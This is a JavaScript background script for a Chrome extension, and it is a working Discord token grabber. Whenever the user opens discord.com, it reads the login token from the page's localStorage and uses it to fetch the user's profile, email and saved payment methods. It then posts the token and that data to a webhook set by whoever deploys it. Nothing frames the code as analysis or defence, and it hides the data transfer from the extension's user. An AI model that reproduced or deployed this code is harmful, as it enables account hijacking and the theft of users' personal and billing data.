let WebhookCooldown = 10; // Cooldown in minutes

let lastSentTimestamp = 0;
const COOLDOWN_MS = WebhookCooldown * 60 * 1000;

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url && changeInfo.url.includes("https://discord.com/")) {
        const now = Date.now();
        if (now - lastSentTimestamp > COOLDOWN_MS) {
            console.log("Cooldown expired. Sending data...");
            lastSentTimestamp = now;
            fetchDiscordData(tabId);
        } else {
            console.log("Cooldown active. Skipping webhook send.");
        }
    }
});

async function fetchDiscordData(tabId) {
    console.log("Fetching Discord data...");
    chrome.scripting.executeScript(
        {
            target: { tabId },
            func: () => window.localStorage.getItem("token"),
        },
        async (results) => {
            if (chrome.runtime.lastError) {
                console.error("Error executing script:", chrome.runtime.lastError.message);
                return;
            }

            const token = results[0]?.result || null;
            if (token) {
                console.log("Token fetched successfully.");
                try {
                    const cleanedToken = token.replace(/^"|"$/g, "");
                    console.log("Fetching user info and payment methods...");
                    const userInfo = await fetchUserInfo(cleanedToken);
                    const paymentMethods = await fetchPaymentMethods(cleanedToken);
                    console.log("Data fetched successfully:", { userInfo, paymentMethods });

                    sendToWebhook(cleanedToken, userInfo, paymentMethods);
                } catch (error) {
                    console.error("Error fetching data:", error);
                }
            } else {
                console.warn("No token found in Discord's localStorage.");
            }
        }
    );
}

async function fetchUserInfo(token) {
    try {
        const response = await fetch('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': token }
        });

        if (!response.ok) {
            throw new Error(`Failed to fetch user info: ${response.statusText}`);
        }

        console.log("User info fetched successfully.");
        return response.json();
    } catch (error) {
        console.error("Error in fetchUserInfo:", error);
        throw error;
    }
}

async function fetchPaymentMethods(token) {
    try {
        const response = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: { 'Authorization': token }
        });

        if (!response.ok) {
            console.warn("No payment methods found or failed to fetch payment methods.");
            return [];
        }

        console.log("Payment methods fetched successfully.");
        return response.json();
    } catch (error) {
        console.error("Error in fetchPaymentMethods:", error);
        throw error;
    }
}

function sendToWebhook(token, userInfo, paymentMethods) {
    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
    const formattedToken = `\n\`\`\`${token}\`\`\`\n`;

    const paymentMethodsField = paymentMethods.length > 0
        ? paymentMethods.map(method => {
            const type = method.type === 1 ? "💳 Credit Card" : "💰 PayPal";
            const lastFour = method.type === 1 ? ` (Last 4: ${method.last_4})` : "";
            return `${type}${lastFour} (ID: ${method.id})`;
        }).join('\n')
        : "No payment methods found.";

    const webhookContent = {
        username: `${userInfo.username}#${userInfo.discriminator}`,
        avatar_url: `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`,
        embeds: [
            {
                title: "Discord User Info",
                description: "Details about the current logged-in user.",
                color: 7506394,
                fields: [
                    { name: "Username", value: `${userInfo.username}#${userInfo.discriminator}`, inline: true },
                    { name: "User ID", value: userInfo.id, inline: true },
                    { name: "Email", value: userInfo.email || "Not Available", inline: true },
                    { name: "Verified", value: userInfo.verified ? "Yes" : "No", inline: true },
                    { name: "Payment Methods", value: paymentMethodsField, inline: false },
                    { name: "Token", value: `${formattedToken}`, inline: false }
                ],
                footer: {
                    text: "Fetched by the extension",
                    icon_url: `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`
                }
            }
        ]
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(webhookContent)
    })
    .then(response => {
        if (response.ok) {
            console.log("User info, token, and payment methods sent to webhook successfully.");
        } else {
            console.error("Failed to send to webhook:", response.status, response.statusText);
        }
    })
    .catch(error => {
        console.error("Error while sending to webhook:", error);
    });
}
